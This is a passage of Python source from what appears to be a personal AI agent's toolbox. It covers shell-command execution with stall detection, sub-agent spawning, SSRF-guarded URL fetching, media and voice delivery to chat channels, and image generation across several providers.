            # Bypass stall watchdog for installation/download/update commands
            is_install_cmd = any(
                keyword in command.lower()
                for keyword in ("install", "download", "setup", "update", "upgrade", "clone", "pull")
            )
            if is_install_cmd:
                STALL_TIMEOUT = None

            if STALL_TIMEOUT is not None and STALL_TIMEOUT <= 0:
                STALL_TIMEOUT = None

            last_progress = _time.monotonic()

            async def read_stream(stream, name):
                nonlocal last_activity, last_progress
                async for line in stream:
                    last_activity = _time.monotonic()
                    line_text = line.decode("utf-8", errors="replace").strip()
                    if line_text:
                        if len(line_text) > 1000:
                            line_text = line_text[:1000] + "... [Line too long]"

                        now = _time.monotonic()
                        if now - last_progress >= 0.02:
                            await self.send_progress(f"[{name}] {line_text}")
                            last_progress = now
                        full_output.append(line_text)

            async def _force_kill(proc):
                """Force-kill a process tree (Windows-safe)."""
                import os as _os

                try:
                    if _os.name == "nt":
                        import subprocess as _sp

                        await asyncio.to_thread(
                            _sp.call,
                            ["taskkill", "/F", "/T", "/PID", str(proc.pid)],
                            stdout=_sp.DEVNULL,
                            stderr=_sp.DEVNULL,
                        )
                    proc.kill()
                except Exception:
                    pass
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except Exception:
                    pass

            def _diagnose_stall(cmd):
                """Return a diagnostic hint based on the command that stalled."""
                cl = cmd.lower()
                if "gh " in cl:
                    return (
                        "The GitHub CLI (gh) likely needs authentication. "
                        "Run 'gh auth login' in a terminal first, or the "
                        "command may need '--json' to avoid paging."
                    )
                if "git push" in cl or "git pull" in cl or "git clone" in cl:
                    return (
                        "Git is likely waiting for credentials. Ensure "
                        "SSH keys or a credential helper are configured."
                    )
                if "npm " in cl:
                    return "npm may be prompting for input. Try adding '--yes' or '-y'."
                if "pip " in cl:
                    return "pip may be prompting. Try adding '--no-input' or '-y'."
                if "ssh " in cl or "scp " in cl:
                    return "SSH is likely waiting for a password or key passphrase."
                return (
                    "The command produced no output and is likely waiting "
                    "for interactive input. Retry with non-interactive flags "
                    "(e.g. --yes, --confirm, -y, --no-input)."
                )

            async def stall_watchdog():
                nonlocal stall_detected
                if not STALL_TIMEOUT:
                    return
                while process.returncode is None:
                    await asyncio.sleep(5)
                    idle = _time.monotonic() - last_activity
                    if idle >= STALL_TIMEOUT:
                        stall_detected = True
                        logger.warning(
                            f"Stall detected ({STALL_TIMEOUT}s no output): {command}"
                        )
                        await self.send_progress(
                            f"⚠️ Command stalled — no output for {STALL_TIMEOUT}s. "
                            "Killing process."
                        )
                        await _force_kill(process)
                        return

            timeout_val = 0
            if self.config:
                if hasattr(self.config, "command_timeout"):
                    try:
                        timeout_val = float(getattr(self.config, "command_timeout"))
                    except (ValueError, TypeError):
                        pass
                elif isinstance(self.config, dict) and "command_timeout" in self.config:
                    try:
                        timeout_val = float(self.config.get("command_timeout", 0))
                    except (ValueError, TypeError):
                        pass

            # Bypass overall command timeout for installation/download/update commands
            if is_install_cmd:
                timeout_val = None

            if timeout_val is not None and timeout_val <= 0:
                timeout_val = None

            try:
                await asyncio.wait_for(
                    asyncio.gather(
                        read_stream(process.stdout, "STDOUT"),
                        read_stream(process.stderr, "STDERR"),
                        stall_watchdog(),
                    ),
                    timeout=timeout_val,
                )
            except asyncio.TimeoutError:
                logger.warning(f"Command timed out after {timeout_val}s: {command}")
                await _force_kill(process)
                full_output.append(
                    f"[TIMEOUT] Command was terminated after {timeout_val} seconds."
                )
            except asyncio.CancelledError:
                logger.warning(f"Command execution cancelled by user: {command}")
                await _force_kill(process)
                raise

            if not stall_detected:
                await process.wait()

            output = "\n".join(full_output)

            output = re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", output)

            if stall_detected:
                diagnosis = _diagnose_stall(command)
                output += (
                    f"\n\n[STALL] Command killed after {STALL_TIMEOUT}s of silence.\n"
                    f"Diagnosis: {diagnosis}"
                )

            exit_code = process.returncode
            if not output:
                output = f"Success (Exit Code: {exit_code}, No output)"
            else:
                output += f"\n\nExit Code: {exit_code}"

            if exit_code not in (0, None):
                output = f"Error: Command failed with exit code {exit_code}.\n{output}"

            try:
                skill_info = self._detect_skill_path(command)
                if skill_info and process.returncode not in (0, None):
                    from core.skill_installer import SkillInstaller

                    skill_dir = skill_info["path"]
                    if skill_dir.exists():
                        installer = SkillInstaller()
                        meta = installer._read_metadata(skill_dir / "SKILL.md")
                        deps_ok, missing, _required = installer._evaluate_skill_deps(
                            skill_dir, meta
                        )
                        if not deps_ok:
                            logger.warning(
                                f"Skill '{skill_info['name']}' failed; missing dependencies detected: {missing}"
                            )
                            output += (
                                "\n\n[SKILL_DEPS_MISSING] "
                                f"Skill '{skill_info['name']}' is missing dependencies. "
                                f"python={missing.get('python', [])}, "
                                f"node={missing.get('node', [])}, "
                                f"binaries={missing.get('binaries', [])}. "
                                "Install dependencies and retry."
                            )
            except Exception as e:
                logger.debug(f"Dependency check skipped: {e}")

            return output
        except Exception as e:
            return f"Error executing command: {e}"

    async def memory_search(self, query: str) -> str:
        """Search vector memory with relevance scores."""
        if not self.vector_service:
            return "Error: Vector service not available."
        try:
            results = await self.vector_service.search(query, limit=5) or []
            if not results:
                return "No semantic matches found."

            res = ["Found relevant memories:"]
            for r in results:
                text = r.get("text", "No content")
                score = r.get("score") or r.get("_distance", 0)
                path = r.get("path", "Unknown source")
                res.append(f"- {text}\n  (Source: {path}, Score: {score})")
            return "\n\n".join(res)
        except Exception as e:
            return f"Error searching memory: {e}"

    async def spawn_agent(
        self,
        task: str,
        session_key: str = None,
        agent: Optional[str] = None,
        background: Optional[bool] = None,
    ) -> str:
        """Spawn a sub-agent and optionally let it report back in the background."""
        if not self.agent:
            return "Error: Agent loop not linked to toolbox."

        if not session_key:
            from core.context import tool_context

            ctx = tool_context.get()
            session_key = f"system:{ctx.get('chat_id', 'global')}"

        sub_session_key = f"{session_key}_sub_{uuid.uuid4().hex[:6]}"
        logger.info(f"🚀 Spawning sub-agent '{sub_session_key}' for task: {task}")

        subagent_profile = None
        if agent:
            logger.info(f"Using sub-agent profile '{agent}' for '{sub_session_key}'")
            if self.subagent_registry is not None:
                try:
                    subagent_profile = self.subagent_registry.get_subagent(agent)
                except Exception:
                    subagent_profile = None

        use_background = bool(background)
        if background is None and subagent_profile:
            use_background = bool(subagent_profile.get("background"))

        try:
            if use_background:

                async def _run_in_background() -> None:
                    try:
                        await self.agent.run_subagent(
                            session_key,
                            sub_session_key,
                            task,
                            agent_name=agent,
                        )
                    except Exception as exc:
                        logger.error(
                            f"Error in background sub-agent '{sub_session_key}': {exc}"
                        )

                asyncio.create_task(_run_in_background())
                mode_label = f"'{agent}'" if agent else "generic worker"
                return (
                    f"Started background sub-agent {mode_label} as "
                    f"'{sub_session_key}'. It will report back when finished."
                )

            result = await self.agent.run_subagent(
                session_key,
                sub_session_key,
                task,
                agent_name=agent,
            )
            return str(result)
        except Exception as e:
            logger.error(f"Error spawning agent: {e}")
            return f"Error spawning agent: {e}"

    @staticmethod
    def _is_safe_public_url(url: str) -> tuple[bool, str]:
        """SSRF guard: only http(s) to a resolvable, public IP address.

        LimeBot runs on a personal machine, so a URL supplied by the LLM (from a
        prompt-injected page or a Discord message) must never be able to reach
        loopback/private/link-local services. Every resolved address is checked.
        """
        url = str(url or "").strip()
        if not url:
            return False, "Empty URL."
        try:
            parsed = urllib.parse.urlparse(url)
        except Exception:
            return False, "Invalid URL."
        if parsed.scheme not in ("http", "https"):
            return False, f"Only http(s) URLs are allowed (got '{parsed.scheme or 'none'}')."
        host = parsed.hostname
        if not host:
            return False, "URL has no host."
        try:
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
        except ValueError:
            return False, "Invalid port in URL."
        try:
            infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
        except Exception as e:
            return False, f"Could not resolve host '{host}': {e}"
        for info in infos:
            ip_str = info[4][0]
            try:
                ip = ipaddress.ip_address(ip_str)
            except ValueError:
                return False, f"Invalid resolved address for '{host}'."
            if (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                or ip.is_reserved
                or ip.is_multicast
                or ip.is_unspecified
            ):
                return False, (
                    f"Refusing to fetch a non-public address ({ip_str}) for host '{host}'."
                )
        return True, ""

    async def _safe_fetch(
        self, url: str, *, max_bytes: int, timeout: float
    ) -> tuple[str, str, bytes]:
        """Fetch a URL, validating every redirect hop against the SSRF guard.

        Returns (final_url, content_type, body_bytes). Raises ValueError for
        unsafe hosts, oversized responses, or redirect loops.
        """
        try:
            import httpx
        except Exception as e:  # pragma: no cover - httpx is a core dep
            raise ValueError(f"httpx is required for URL fetching: {e}")

        headers = {
            "User-Agent": _DOWNLOAD_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://www.google.com/",
        }
        current = url
        async with httpx.AsyncClient(
            timeout=timeout, follow_redirects=False, headers=headers
        ) as client:
            for _ in range(6):
                ok, reason = self._is_safe_public_url(current)
                if not ok:
                    raise ValueError(reason)
                async with client.stream("GET", current) as response:
                    if response.is_redirect:
                        location = response.headers.get("location", "")
                        if not location:
                            raise ValueError("Redirect without a location header.")
                        current = urllib.parse.urljoin(current, location)
                        continue
                    response.raise_for_status()
                    content_type = (
                        (response.headers.get("content-type") or "")
                        .split(";")[0]
                        .strip()
                        .lower()
                    )
                    buf = bytearray()
                    total = 0
                    async for chunk in response.aiter_bytes():
                        total += len(chunk)
                        if total > max_bytes:
                            raise ValueError(
                                f"Response exceeds the {max_bytes // (1024 * 1024)}MB limit."
                            )
                        buf.extend(chunk)
                    return current, content_type, bytes(buf)
        raise ValueError("Too many redirects.")

    @staticmethod
    def _guess_download_extension(data: bytes, content_type: str, url: str) -> str:
        """Pick a file extension from magic bytes, then content-type, then URL."""
        if data[:3] == b"\xff\xd8\xff":
            return ".jpg"
        if data[:8] == b"\x89PNG\r\n\x1a\n":
            return ".png"
        if data[:4] == b"GIF8":
            return ".gif"
        if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
            return ".webp"
        if data[:4] == b"%PDF":
            return ".pdf"
        if content_type:
            ext = mimetypes.guess_extension(content_type)
            if ext:
                return ".jpg" if ext == ".jpe" else ext
        suffix = Path(urllib.parse.urlparse(url).path).suffix
        if suffix and len(suffix) <= 6 and re.fullmatch(r"\.[A-Za-z0-9]+", suffix):
            return suffix
        return ".bin"

    async def fetch_url_to_temp(
        self, url: str, max_bytes: int = _MAX_DOWNLOAD_BYTES
    ) -> str:
        """Download a public http(s) URL into temp/downloads and return its path."""
        url = str(url or "").strip()
        ok, reason = self._is_safe_public_url(url)
        if not ok:
            return f"Error: {reason}"

        await self.send_progress(f"⬇️ Downloading: {url}")
        dest_dir = self.allowed_paths[0] / "temp" / "downloads"
        try:
            await asyncio.to_thread(lambda: dest_dir.mkdir(parents=True, exist_ok=True))
        except Exception as e:
            return f"Error: Could not create download directory: {e}"

        try:
            final_url, content_type, data = await self._safe_fetch(
                url, max_bytes=max_bytes, timeout=30.0
            )
        except ValueError as e:
            return f"Error: {e}"
        except Exception as e:
            return f"Error: Download failed: {e}"

        if not data:
            return "Error: Downloaded file was empty."

        ext = self._guess_download_extension(data, content_type, final_url)
        dest = dest_dir / f"dl_{uuid.uuid4().hex[:12]}{ext}"
        try:
            await asyncio.to_thread(dest.write_bytes, data)
        except Exception as e:
            return f"Error: Could not save file: {e}"
        return self._to_display_path(dest)

    @staticmethod
    def _html_to_text(html: str) -> str:
        """Best-effort readable text from HTML (BeautifulSoup if available)."""
        try:
            from bs4 import BeautifulSoup
        except Exception:
            return re.sub(r"<[^>]+>", " ", html)
        soup = BeautifulSoup(html, "html.parser")
        for tag in soup(
            ["script", "style", "noscript", "nav", "footer", "header", "svg", "form"]
        ):
            tag.decompose()
        text = soup.get_text("\n", strip=True)
        return re.sub(r"\n{3,}", "\n\n", text)

    async def fetch_readable_text(self, url: str, max_chars: int = 4000) -> str:
        """Fetch a page and return its readable text, SSRF-guarded."""
        url = str(url or "").strip()
        ok, reason = self._is_safe_public_url(url)
        if not ok:
            return f"Error: {reason}"
        try:
            _final_url, content_type, data = await self._safe_fetch(
                url, max_bytes=5 * 1024 * 1024, timeout=20.0
            )
        except ValueError as e:
            return f"Error: {e}"
        except Exception as e:
            return f"Error: Fetch failed: {e}"

        text = data.decode("utf-8", errors="ignore")
        if "html" in content_type or "<html" in text[:2000].lower():
            text = self._html_to_text(text)
        text = text.strip()
        if not text:
            return "Error: No readable text found at that URL."
        if len(text) > max_chars:
            text = text[:max_chars] + f"\n... (truncated at {max_chars} chars)"
        return text

    async def _publish_web_media(self, file_path: Path, caption: str) -> None:
        """Publish a local file to the web chat as a servable attachment."""
        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        chat_id = (ctx.get("chat_id") or "").strip()
        if not chat_id:
            return

        # Ensure the file lives under temp/ so the /temp static mount can serve it.
        temp_root = (self.allowed_paths[0] / "temp").resolve()
        try:
            file_path.resolve().relative_to(temp_root)
            servable = file_path
        except Exception:
            dl_dir = self.allowed_paths[0] / "temp" / "downloads"
            await asyncio.to_thread(
                lambda: dl_dir.mkdir(parents=True, exist_ok=True)
            )
            servable = dl_dir / file_path.name
            await asyncio.to_thread(shutil.copyfile, file_path, servable)

        mime_type = mimetypes.guess_type(servable.name)[0] or "application/octet-stream"
        is_image = mime_type.startswith("image/")
        url = ""
        try:
            rel = servable.resolve().relative_to(temp_root)
            url = f"/temp/{rel.as_posix()}"
        except Exception:
            if is_image:
                try:
                    blob = await asyncio.to_thread(servable.read_bytes)
                    url = (
                        f"data:{mime_type};base64,"
                        f"{base64.b64encode(blob).decode('ascii')}"
                    )
                except Exception:
                    url = ""

        attachment = {
            "name": servable.name,
            "kind": "image" if is_image else "document",
            "mime_type": mime_type,
            "mimeType": mime_type,
            "path": self._to_display_path(servable),
            "url": url,
        }
        metadata: Dict[str, Any] = {"attachments": [attachment]}
        if is_image and url:
            metadata["image"] = url
        await self.bus.publish_outbound(
            OutboundMessage(
                channel="web", chat_id=chat_id, content=caption, metadata=metadata
            )
        )

    async def send_media(self, path: str, caption: str = "") -> str:
        """Share a local file OR a remote http(s) URL into the current chat.

        Works for web, Discord, and WhatsApp. Remote URLs are downloaded into
        temp/downloads first (SSRF-guarded), then delivered as a local file, so
        the agent can act on image URLs found via image_search / web_search.
        """
        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        channel = (ctx.get("channel") or "").strip().lower()
        chat_id = (ctx.get("chat_id") or "").strip()

        if channel not in {"discord", "whatsapp", "web"}:
            return (
                "Error: send_media is only available in web, Discord, or WhatsApp "
                "conversations."
            )
        if not chat_id:
            return "Error: Missing current chat context for media delivery."

        source = str(path or "").strip()
        if not source:
            return "Error: A local file path or http(s) URL is required."

        if source.lower().startswith(("http://", "https://")):
            downloaded = await self.fetch_url_to_temp(source)
            if downloaded.startswith("Error:"):
                return downloaded
            path = downloaded

        ok, error, resolved = self._is_path_shareable(path)
        if not ok or resolved is None:
            return f"Error: {error}"

        caption = str(caption or "").strip()

        if channel == "web":
            await self._publish_web_media(resolved, caption)
            return f"Displayed '{self._to_display_path(resolved)}' in the web chat."

        await self.bus.publish_outbound(
            OutboundMessage(
                channel=channel,
                chat_id=chat_id,
                content="",
                metadata={
                    "type": "file",
                    "file_path": str(resolved),
                    "caption": caption,
                },
            )
        )
        display_path = self._to_display_path(resolved)
        return f"Sent '{display_path}' to the current {channel} chat."

    async def send_voice(self, text: str, channel: str = "") -> str:
        """Speak `text` aloud as a voice message in the current chat.

        Synthesizes speech with ElevenLabs and delivers it as audio: an mp3 file
        on Discord/WhatsApp, or an inline playable clip on web. Use this when the
        user asks to be sent a voice message / voice note instead of text.

        Requires an ElevenLabs API key (Settings → Credentials). Returns an
        "Error: ..." string if voice is unavailable so you can fall back to text.
        """
        from core.context import tool_context
        from core.events import OutboundMessage

        try:
            from core.tts import ElevenLabsTTS
        except Exception as e:  # pragma: no cover - defensive import guard
            return f"Error: voice synthesis is unavailable ({e})."

        ctx = tool_context.get() or {}
        ctx_channel = (ctx.get("channel") or "").strip().lower()
        target = (str(channel or "").strip().lower()) or ctx_channel
        chat_id = (ctx.get("chat_id") or "").strip()

        if target not in {"discord", "whatsapp", "web"}:
            return (
                "Error: send_voice is only available in web, Discord, or WhatsApp "
                "conversations."
            )
        if not chat_id:
            return "Error: Missing current chat context for voice delivery."

        spoken = str(text or "").strip()
        if not spoken:
            return "Error: Text to speak is required."

        if not ElevenLabsTTS.get_api_key():
            return (
                "Error: ElevenLabs API key is not configured. Add it under "
                "Settings → Credentials to enable voice."
            )

        if target == "web":
            audio_url = await ElevenLabsTTS.synthesize_and_save(spoken)
            if not audio_url:
                return "Error: Voice synthesis failed."
            await self.bus.publish_outbound(
                OutboundMessage(
                    channel="web",
                    chat_id=chat_id,
                    content="",
                    metadata={"voice_url": audio_url},
                )
            )
            return "Sent a voice message to the web chat."

        audio_path = await ElevenLabsTTS.synthesize_to_file(spoken)
        if not audio_path:
            return "Error: Voice synthesis failed."
        await self.bus.publish_outbound(
            OutboundMessage(
                channel=target,
                chat_id=chat_id,
                content="",
                metadata={
                    "type": "file",
                    "file_path": audio_path,
                    "caption": "",
                    "cleanup_file": True,
                },
            )
        )
        return f"Sent a voice message to the current {target} chat."

    @staticmethod
    def _normalize_image_model(model: str) -> str:
        return str(model or "").strip()

    @staticmethod
    def _is_gemini_image_model(model: str) -> bool:
        normalized = str(model or "").strip()
        bare = normalized.split("/", 1)[-1]
        return normalized.startswith(("gemini/", "google/")) and (
            "flash-image" in bare
            or "pro-image" in bare
            or "image-preview" in bare
        )

    @staticmethod
    def _is_openai_image_model(model: str) -> bool:
        bare = str(model or "").strip().split("/", 1)[-1]
        return (
            bare.startswith(("gpt-image-", "dall-e-"))
            or bare == "chatgpt-image-latest"
        )

    @staticmethod
    def _image_extension_for_mime(mime_type: str) -> str:
        normalized = (mime_type or "image/png").split(";", 1)[0].strip().lower()
        if normalized == "image/jpeg":
            return ".jpg"
        if normalized == "image/webp":
            return ".webp"
        return mimetypes.guess_extension(normalized) or ".png"

    @staticmethod
    def _gemini_aspect_ratio(size: str) -> str:
        normalized = str(size or "").strip().lower()
        if not normalized:
            return ""
        if ":" in normalized and "x" not in normalized:
            return normalized
        ratios = {
            "1024x1024": "1:1",
            "1536x1024": "3:2",
            "1024x1536": "2:3",
            "1792x1024": "16:9",
            "1024x1792": "9:16",
        }
        return ratios.get(normalized, "")

    @staticmethod
    def _codex_account_id(token: str) -> str:
        try:
            parts = str(token or "").split(".")
            if len(parts) != 3:
                return ""
            payload = parts[1] + "=" * (-len(parts[1]) % 4)
            claims = json.loads(base64.urlsafe_b64decode(payload.encode("ascii")))
            auth = claims.get("https://api.openai.com/auth") or {}
            return str(auth.get("chatgpt_account_id") or "").strip()
        except Exception:
            return ""

    @staticmethod
    def _codex_image_model(model: str) -> str:
        normalized = str(model or "").strip()
        if normalized.startswith("openai-codex/"):
            bare = normalized.removeprefix("openai-codex/")
            if bare and not bare.startswith(("gpt-image-", "dall-e-")):
                return bare
        return "gpt-5.4-mini"

    def _image_model_candidates(self, requested_model: str) -> List[str]:
        requested = self._normalize_image_model(requested_model)
        image_cfg = getattr(self.config, "image_generation", None)
        configured = self._normalize_image_model(getattr(image_cfg, "model", ""))
        primary_chat = str(getattr(getattr(self.config, "llm", None), "model", "") or "")
        codex_model = (
            primary_chat
            if primary_chat.startswith("openai-codex/")
            else "openai-codex/gpt-5.4-mini"
        )

        raw_candidates = [requested, configured, codex_model, "openai/gpt-image-2"]
        candidates: List[str] = []
        for candidate in raw_candidates:
            candidate = str(candidate or "").strip()
            if not candidate or candidate in candidates:
                continue
            if self._is_gemini_image_model(candidate) and not os.getenv("GEMINI_API_KEY"):
                continue
            if candidate.startswith("openai/") and not os.getenv("OPENAI_API_KEY"):
                continue
            candidates.append(candidate)
        return candidates

    async def _resolve_image_references(
        self,
        reference_images: Optional[List[str]],
        use_attached_images: Optional[bool],
    ) -> tuple[List[Dict[str, Any]], bool]:
        from core.context import tool_context

        explicit = (
            [reference_images]
            if isinstance(reference_images, str)
            else list(reference_images or [])
        )
        ctx = tool_context.get() or {}
        should_use_attached = (
            bool(ctx.get("auto_reference_images"))
            if use_attached_images is None
            else bool(use_attached_images)
        )
        candidates: List[str] = [str(path or "").strip() for path in explicit]
        if should_use_attached:
            for attachment in [
                *(ctx.get("attachments") or []),
                *(ctx.get("recent_image_attachments") or []),
            ]:
                if not isinstance(attachment, dict):
                    continue
                path = str(attachment.get("path") or "").strip()
                if path:
                    candidates.append(path)

        reference_requested = bool(explicit) or should_use_attached
        references: List[Dict[str, Any]] = []
        seen: set[Path] = set()
        for candidate in candidates:
            if not candidate:
                continue
            allowed, reason, path = self._is_path_shareable(candidate)
            if not allowed or path is None:
                if explicit:
                    raise ValueError(reason or f"Reference image is unavailable: {candidate}")
                continue
            if path in seen:
                continue
            if path.suffix.lower() not in _IMAGE_REFERENCE_EXTENSIONS:
                raise ValueError(
                    f"Unsupported reference image format '{path.suffix or 'unknown'}'. "
                    "Use PNG, JPEG, or WebP."
                )
            size = path.stat().st_size
            if size <= 0 or size > _MAX_IMAGE_REFERENCE_BYTES:
                raise ValueError(
                    f"Reference image '{path.name}' must be between 1 byte and 50 MiB."
                )
            blob = await asyncio.to_thread(path.read_bytes)
            mime_type = mimetypes.guess_type(path.name)[0] or "image/png"
            references.append(
                {
                    "name": path.name,
                    "path": path,
                    "mime_type": mime_type,
                    "bytes": blob,
                    "data_url": (
                        f"data:{mime_type};base64,"
                        f"{base64.b64encode(blob).decode('ascii')}"
                    ),
                }
            )
            seen.add(path)
            if len(references) >= _MAX_IMAGE_REFERENCES:
                break

        return references, reference_requested

    async def _generate_codex_image(
        self,
        prompt: str,
        model: str,
        count: int,
        size: str,
        quality: str,
        references: Optional[List[Dict[str, Any]]] = None,
    ) -> List[Dict[str, str]]:
        from core.oauth_profiles import resolve_codex_oauth_api_key

        import httpx

        token = resolve_codex_oauth_api_key()
        account_id = self._codex_account_id(token)
        if not account_id:
            raise RuntimeError("Codex OAuth token did not include a ChatGPT account id.")

        prompt_hints = []
        if size:
            prompt_hints.append(f"Output size/aspect request: {size}.")
        if quality and quality != "auto":
            prompt_hints.append(f"Quality request: {quality}.")
        full_prompt = prompt
        if prompt_hints:
            full_prompt = f"{prompt}\n\n" + "\n".join(prompt_hints)

        input_content: List[Dict[str, Any]] = [
            {"type": "input_text", "text": full_prompt}
        ]
        input_content.extend(
            {
                "type": "input_image",
                "image_url": reference["data_url"],
            }
            for reference in (references or [])
        )

        payload = {
            "model": self._codex_image_model(model),
            "instructions": (
                "Generate exactly one image using the hosted image_generation tool. "
                "Return no text unless required."
            ),
            "store": False,
            "stream": True,
            "input": [
                {
                    "role": "user",
                    "content": input_content,
                }
            ],
            "tools": [{"type": "image_generation"}],
            "tool_choice": {"type": "image_generation"},
        }
        headers = {
            "Authorization": f"Bearer {token}",
            "chatgpt-account-id": account_id,
            "originator": "limebot",
            "OpenAI-Beta": "responses=experimental",
            "accept": "text/event-stream",
            "content-type": "application/json",
        }

        images: List[Dict[str, str]] = []
        async with httpx.AsyncClient(timeout=180.0) as client:
            for _ in range(count):
                async with client.stream(
                    "POST",
                    "https://chatgpt.com/backend-api/codex/responses",
                    headers=headers,
                    json=payload,
                ) as response:
                    if response.status_code >= 400:
                        detail = await response.aread()
                        text = detail.decode("utf-8", errors="replace").strip()
                        raise RuntimeError(
                            f"Codex image generation failed ({response.status_code}): {text}"
                        )

                    async for line in response.aiter_lines():
                        if not line.startswith("data:"):
                            continue
                        raw = line.removeprefix("data:").strip()
                        if not raw or raw == "[DONE]":
                            continue
                        try:
                            event = json.loads(raw)
                        except Exception:
                            continue
                        if event.get("type") == "response.failed":
                            error = (event.get("response") or {}).get("error") or {}
                            message = error.get("message") or json.dumps(event)[:500]
                            raise RuntimeError(f"Codex image generation failed: {message}")
                        item = event.get("item") or {}
                        if item.get("type") != "image_generation_call":
                            continue
                        b64 = item.get("result") or item.get("b64_json")
                        if b64:
                            images.append({"b64": b64, "mime_type": "image/png"})
                            break
        return images

    async def _generate_gemini_image(
        self,
        prompt: str,
        model: str,
        count: int,
        size: str,
        references: Optional[List[Dict[str, Any]]] = None,
    ) -> List[Dict[str, str]]:
        from core.llm_utils import get_api_key_for_model

        import httpx

        api_key = get_api_key_for_model(model)
        if not api_key:
            raise RuntimeError("GEMINI_API_KEY is not configured.")

        bare_model = model.split("/", 1)[-1]
        generation_config: Dict[str, Any] = {"responseModalities": ["Image"]}
        aspect_ratio = self._gemini_aspect_ratio(size)
        if aspect_ratio:
            generation_config["responseFormat"] = {
                "image": {"aspectRatio": aspect_ratio}
            }

        url = (
            "https://generativelanguage.googleapis.com/v1/models/"
            f"{bare_model}:generateContent"
        )
        parts: List[Dict[str, Any]] = [{"text": prompt}]
        parts.extend(
            {
                "inlineData": {
                    "mimeType": reference["mime_type"],
                    "data": base64.b64encode(reference["bytes"]).decode("ascii"),
                }
            }
            for reference in (references or [])
        )
        payload = {
            "contents": [{"parts": parts}],
            "generationConfig": generation_config,
        }
        images: List[Dict[str, str]] = []
        async with httpx.AsyncClient(timeout=120.0) as client:
            for _ in range(count):
                response = await client.post(
                    url,
                    params={"key": api_key},
                    json=payload,
                )
                response.raise_for_status()
                data = response.json()
                for candidate in data.get("candidates", []) or []:
                    content = candidate.get("content", {}) or {}
                    for part in content.get("parts", []) or []:
                        inline = part.get("inlineData") or part.get("inline_data")
                        if not isinstance(inline, dict):
                            continue
                        b64 = inline.get("data")
                        if not b64:
                            continue
                        images.append(
                            {
                                "b64": b64,
                                "mime_type": inline.get("mimeType")
                                or inline.get("mime_type")
                                or "image/png",
                            }
                        )
        return images

    async def _generate_litellm_image(
        self,
        prompt: str,
        model: str,
        count: int,
        size: str,
        quality: str,
    ) -> List[Dict[str, str]]:
        from core.llm_utils import get_api_key_for_model
        from litellm import aimage_generation

        import httpx

        api_key = get_api_key_for_model(model)
        litellm_model = model
        if model.startswith("openai/"):
            litellm_model = model.removeprefix("openai/")

        kwargs: Dict[str, Any] = {
            "prompt": prompt,
            "model": litellm_model,
            "n": count,
            "size": size,
            "timeout": 180,
        }
        if api_key:
            kwargs["api_key"] = api_key
        if quality and quality != "auto":
            kwargs["quality"] = quality
        if not model.startswith(("gemini/", "google/")):
            kwargs["response_format"] = "b64_json"

        response = await aimage_generation(**kwargs)
        data = getattr(response, "data", None)
        if data is None and isinstance(response, dict):
            data = response.get("data")

        images: List[Dict[str, str]] = []
        for item in data or []:
            b64 = getattr(item, "b64_json", None)
            url = getattr(item, "url", None)
            if isinstance(item, dict):
                b64 = item.get("b64_json") or item.get("b64")
                url = item.get("url")
            if b64:
                images.append({"b64": b64, "mime_type": "image/png"})
                continue
            if url:
                async with httpx.AsyncClient(timeout=120.0) as client:
                    downloaded = await client.get(url)
                    downloaded.raise_for_status()
                    mime_type = downloaded.headers.get("content-type", "image/png")
                    images.append(
                        {
                            "b64": base64.b64encode(downloaded.content).decode("ascii"),
                            "mime_type": mime_type,
                        }
                    )
        return images

    async def _generate_openai_image_edit(
        self,
        prompt: str,
        model: str,
        count: int,
        size: str,
        quality: str,
        references: List[Dict[str, Any]],
    ) -> List[Dict[str, str]]:
        """Call the native Images edit endpoint with one or more references."""
        from core.llm_utils import get_api_key_for_model

        import httpx

        api_key = get_api_key_for_model(model)
        if not api_key:
            raise RuntimeError("OPENAI_API_KEY is not configured for image editing.")

        bare_model = model.removeprefix("openai/")
        form: Dict[str, str] = {
            "model": bare_model,
            "prompt": prompt,
            "n": str(count),
            "size": size,
        }
        if quality and quality != "auto":
            form["quality"] = quality
        files = [
            (
                "image[]",
                (
                    reference["name"],
                    reference["bytes"],
                    reference["mime_type"],
                ),
            )
            for reference in references
        ]
        async with httpx.AsyncClient(timeout=180.0) as client:
            response = await client.post(
                "https://api.openai.com/v1/images/edits",
                headers={"Authorization": f"Bearer {api_key}"},
                data=form,
                files=files,
            )
            if response.status_code >= 400:
                try:
                    error = response.json().get("error") or {}
                    detail = str(error.get("message") or "Image edit request failed.")
                except Exception:
                    detail = "Image edit request failed."
                raise RuntimeError(
                    f"OpenAI image edit failed ({response.status_code}): {detail[:500]}"
                )
            payload = response.json()

        images: List[Dict[str, str]] = []
        for item in payload.get("data", []) or []:
            b64 = item.get("b64_json") if isinstance(item, dict) else None
            url = item.get("url") if isinstance(item, dict) else None
            if b64:
                images.append({"b64": b64, "mime_type": "image/png"})
                continue
            if url:
                async with httpx.AsyncClient(timeout=120.0) as client:
                    downloaded = await client.get(url)
                    downloaded.raise_for_status()
                    images.append(
                        {
                            "b64": base64.b64encode(downloaded.content).decode(
                                "ascii"
                            ),
                            "mime_type": downloaded.headers.get(
                                "content-type", "image/png"
                            ),
                        }
                    )
        return images

    async def _publish_generated_image_preview(
        self,
        paths: List[Path],
        caption: str,
    ) -> None:
        if not paths:
            return

        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        channel = (ctx.get("channel") or "").strip().lower()
        chat_id = (ctx.get("chat_id") or "").strip()
        if not channel or not chat_id:
            return

        first_path = paths[0]
        relative_url = ""
        try:
            relative_url = f"/temp/{first_path.relative_to(Path('temp').resolve()).as_posix()}"
        except ValueError:
            relative_url = ""
        mime_type = mimetypes.guess_type(first_path.name)[0] or "image/png"
        attachment = {
            "name": first_path.name,
            "kind": "image",
            "mime_type": mime_type,
            "mimeType": mime_type,
            "path": self._to_display_path(first_path),
            "url": relative_url or self._to_display_path(first_path),
        }

        if channel in {"discord", "whatsapp"}:
            await self.bus.publish_outbound(
                OutboundMessage(
                    channel=channel,
                    chat_id=chat_id,
                    content="",
                    metadata={
                        "type": "file",
                        "file_path": str(first_path),
                        "caption": caption,
                    },
